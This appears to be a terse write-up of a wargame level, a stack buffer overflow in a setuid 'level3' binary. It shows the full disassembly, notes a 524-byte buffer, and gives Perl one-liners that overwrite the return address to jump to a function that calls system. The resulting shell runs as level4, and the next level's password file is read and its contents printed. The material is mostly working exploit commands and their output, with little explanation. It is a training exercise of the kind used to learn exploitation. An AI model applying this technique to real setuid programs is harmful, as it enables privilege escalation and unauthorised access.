$objdump -S ./level3

0804843c <callMe>:
 804843c:	55                   	push   %ebp
 804843d:	89 e5                	mov    %esp,%ebp
 804843f:	83 ec 08             	sub    $0x8,%esp
 8048442:	a1 b8 85 04 08       	mov    0x80485b8,%eax
 8048447:	8b 15 bc 85 04 08    	mov    0x80485bc,%edx
 804844d:	89 45 f8             	mov    %eax,0xfffffff8(%ebp)
 8048450:	89 55 fc             	mov    %edx,0xfffffffc(%ebp)
 8048453:	83 ec 04             	sub    $0x4,%esp
 8048456:	83 ec 0c             	sub    $0xc,%esp
 8048459:	e8 1a ff ff ff       	call   8048378 <geteuid@plt>
 804845e:	83 c4 0c             	add    $0xc,%esp
 8048461:	50                   	push   %eax
 8048462:	83 ec 08             	sub    $0x8,%esp
 8048465:	e8 0e ff ff ff       	call   8048378 <geteuid@plt>
 804846a:	83 c4 08             	add    $0x8,%esp
 804846d:	50                   	push   %eax
 804846e:	83 ec 04             	sub    $0x4,%esp
 8048471:	e8 02 ff ff ff       	call   8048378 <geteuid@plt>
 8048476:	83 c4 04             	add    $0x4,%esp
 8048479:	50                   	push   %eax
 804847a:	e8 c9 fe ff ff       	call   8048348 <setresuid@plt>
 804847f:	83 c4 10             	add    $0x10,%esp
 8048482:	83 ec 0c             	sub    $0xc,%esp
 8048485:	8d 45 f8             	lea    0xfffffff8(%ebp),%eax
 8048488:	50                   	push   %eax
 8048489:	e8 9a fe ff ff       	call   8048328 <system@plt>
 804848e:	83 c4 10             	add    $0x10,%esp
 8048491:	c9                   	leave  
 8048492:	c3                   	ret    

08048493 <main>:
 8048493:	55                   	push   %ebp
 8048494:	89 e5                	mov    %esp,%ebp
 8048496:	81 ec 08 02 00 00    	sub    $0x208,%esp
 804849c:	83 e4 f0             	and    $0xfffffff0,%esp
 804849f:	b8 00 00 00 00       	mov    $0x0,%eax
 80484a4:	83 c0 0f             	add    $0xf,%eax
 80484a7:	83 c0 0f             	add    $0xf,%eax
 80484aa:	c1 e8 04             	shr    $0x4,%eax
 80484ad:	c1 e0 04             	shl    $0x4,%eax
 80484b0:	29 c4                	sub    %eax,%esp
 80484b2:	83 ec 08             	sub    $0x8,%esp
 80484b5:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484b8:	83 c0 04             	add    $0x4,%eax
 80484bb:	ff 30                	pushl  (%eax)
 80484bd:	8d 85 f8 fd ff ff    	lea    0xfffffdf8(%ebp),%eax
 80484c3:	50                   	push   %eax
 80484c4:	e8 8f fe ff ff       	call   8048358 <strcpy@plt>
 80484c9:	83 c4 10             	add    $0x10,%esp
 80484cc:	83 ec 08             	sub    $0x8,%esp
 80484cf:	8d 85 f8 fd ff ff    	lea    0xfffffdf8(%ebp),%eax
 80484d5:	50                   	push   %eax
 80484d6:	68 c0 85 04 08       	push   $0x80485c0
 80484db:	e8 88 fe ff ff       	call   8048368 <printf@plt>
 80484e0:	83 c4 10             	add    $0x10,%esp
 80484e3:	c9                   	leave  
 80484e4:	c3                   	ret    
 80484e5:	90                   	nop    
 80484e6:	90                   	nop    
 80484e7:	90                   	nop    
 80484e8:	90                   	nop    
 80484e9:	90                   	nop    
 80484ea:	90                   	nop    
 80484eb:	90                   	nop    
 80484ec:	90                   	nop    
 80484ed:	90                   	nop    
 80484ee:	90                   	nop    
 80484ef:	90                   	nop    


buffer长度为524
/tmp/my_level3 $(perl -e 'print "A"x(524)."BBBB"')
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
[level3@logic level3]$ ./level3 $(perl -e 'print "A"x(524)."\x3c\x84\x04\x08"')
sh-3.2$ whoami
level4
sh-3.2$ cd /home/level4
sh-3.2$ more .pass
fdsg53fsdfasdv




